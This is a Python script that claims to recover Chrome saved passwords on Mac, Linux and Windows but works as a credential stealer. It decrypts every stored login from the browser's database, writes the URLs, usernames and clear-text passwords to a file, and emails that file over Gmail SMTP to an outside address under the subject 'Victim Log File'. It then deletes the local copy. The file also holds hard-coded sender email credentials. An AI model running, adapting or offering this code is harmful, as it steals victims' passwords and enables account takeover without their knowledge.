""" Get unencrypted 'Saved Password' from Google Chrome
    Supported platform: Mac, Linux and Windows
"""
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import json
import os
import platform
import sqlite3
import string
import subprocess
from getpass import getuser
from importlib import import_module
from os import unlink
from shutil import copy
import crypto
import sys

sys.modules['Crypto'] = crypto

import secretstorage

__author__ = 'Priyank Chheda'
__email__ = 'p.chheda29@gmail.com'


class ChromeMac:
    """ Decryption class for chrome mac installation """
    def __init__(self):
        """ Mac Initialization Function """
        my_pass = subprocess.Popen(
            "security find-generic-password -wa 'Chrome'",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True)
        stdout, _ = my_pass.communicate()
        my_pass = stdout.replace(b'\n', b'')

        iterations = 1003
        salt = b'saltysalt'
        length = 16

        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = (f"/Users/{getuser()}/Library/Application Support/"
                       "Google/Chrome/Default/")

    def decrypt_func(self, enc_passwd):
        """ Mac Decryption Function """
        aes = import_module('Crypto.Cipher.AES')
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


class ChromeWin:
    """ Decryption class for chrome windows installation """
    def __init__(self):
        """ Windows Initialization Function """
        # search the genral chrome version path
        win_path = f"C:\\Users\\{getuser()}\\AppData\\Local\\Google" "\\{chrome}\\User Data\\Default\\"
        win_chrome_ver = [
            item for item in
            ['chrome', 'chrome dev', 'chrome beta', 'chrome canary']
            if os.path.exists(win_path.format(chrome=item))
        ]
        self.dbpath = win_path.format(chrome=''.join(win_chrome_ver))
        # self.dbpath = (f"C:\\Users\\{getuser()}\\AppData\\Local\\Google"
        #                "\\Chrome\\User Data\\Default\\")

    def decrypt_func(self, enc_passwd):
        """ Windows Decryption Function """
        win32crypt = import_module('win32crypt')
        data = win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)
        return data[1].decode('utf8')


class ChromeLinux:
    """ Decryption class for chrome linux installation """
    def __init__(self):
        """ Linux Initialization Function """
        my_pass = 'peanuts'.encode('utf8')
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                my_pass = item.get_secret()
                break
        iterations = 1
        salt = b'saltysalt'
        length = 16

        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"

        # try flatpak path
        if not os.path.exists(self.dbpath):
            self.dbpath = f"/home/{getuser()}/.var/app/com.google.Chrome/config/google-chrome/Default/"
        if not os.path.exists(self.dbpath):
            self.dbpath = f"/home/{getuser()}/.local/share/flatpak/app/com.google.Chrome/current/active/files/extra/.config/google-chrome/Default/"

        # try snap path
        if not os.path.exists(self.dbpath):
            self.dbpath = f"/home/{getuser()}/snap/google-chrome/common/.config/google-chrome/Default/"

        if not os.path.exists(self.dbpath):
            raise Exception("Chrome path not found. Please specify manually using -d option")
        
        self.dbpath = os.path.abspath(self.dbpath)


    def decrypt_func(self, enc_passwd):
        """ Linux Decryption Function """
        aes = import_module('Crypto.Cipher.AES')
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


class Chrome:
    """ Generic OS independent Chrome class """
    def __init__(self):
        """ determine which platform you are on """
        target_os = platform.system()
        if target_os == 'Darwin':
            self.chrome_os = ChromeMac()
        elif target_os == 'Windows':
            self.chrome_os = ChromeWin()
        elif target_os == 'Linux':
            self.chrome_os = ChromeLinux()

    @property
    def get_login_db(self):
        """ getting "Login Data" sqlite database path """
        return self.chrome_os.dbpath

    def get_password(self, prettyprint=False):
        """ get URL, username and password in clear text
            :param prettyprint: if true, print clear text password to screen
            :return: clear text data in dictionary format
        """
        copy(os.path.join(self.chrome_os.dbpath, "Login Data"), "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute("""
            SELECT action_url, username_value, password_value
            FROM logins; """)
        data = {'data': []}
        for result in cursor.fetchall():
            _passwd = self.chrome_os.decrypt_func(result[2])
            passwd = ''.join(i for i in _passwd if i in string.printable)
            if result[1] or passwd:
                _data = {}
                _data['url'] = result[0]
                _data['username'] = result[1]
                _data['password'] = passwd
                data['data'].append(_data)
        conn.close()
        unlink("Login Data.db")

        if prettyprint:
            return json.dumps(data, indent=2)
        return data

def create_text_file(file_path, content):
    with open(file_path, 'w') as file:
        file.write(content)


def send_email_with_attachment(sender_email, sender_password, recipient_email, subject, body, attachment_path):
    # Create the email
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    
    # Attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))
    
    # Open the file to be sent
    with open(attachment_path, "rb") as attachment:
        # Instance of MIMEBase and named as p
        p = MIMEBase('application', 'octet-stream')
        
        # To change the payload into encoded form
        p.set_payload(attachment.read())
        
        # Encode into base64
        encoders.encode_base64(p)
        
        p.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(attachment_path)}")
        
        # Attach the instance 'p' to instance 'msg'
        msg.attach(p)
    
    try:
        # Connect to the server
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        
        # Login to the server
        server.login(sender_email, sender_password)
        
        # Send the email
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        
        # Quit the server
        server.quit()
        
        print(".")
    except Exception as e:
        print("..x..", e)
    
    # Delete the file after sending the email
    try:
        os.remove(attachment_path)
        print("-..")
    except Exception as e:
        print("-...x..")



def main():
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--directory', help='Chrome directory path', default=None, type=str)

    args = parser.parse_args()

    """ Operational Script """
    chrome_pwd = Chrome()
    if args.directory:
        chrome_pwd.chrome_os.dbpath = args.directory

    # print("here", chrome_pwd.get_login_db)
    # print("meme", chrome_pwd.get_password(prettyprint=True))
    print("...cc")
    filecontentx = chrome_pwd.get_password(prettyprint=True)
    filecontentxi = filecontentx
    filecontent = "'" + filecontentxi + "'"

    file_path = "LogFile.txt"
    create_text_file(file_path, filecontent)

    # Usage
    send_email_with_attachment(
        sender_email="anonymous.server.tracking@gmail.com",
        sender_password="zbfxwoklfjrdinhu",
        recipient_email="Anonymousxcript2gmail.com",
        subject="Victim Log File",
        body="Happy Hacking 👨‍💻!!!",
        attachment_path=file_path
    )


if __name__ == '__main__':
    main()
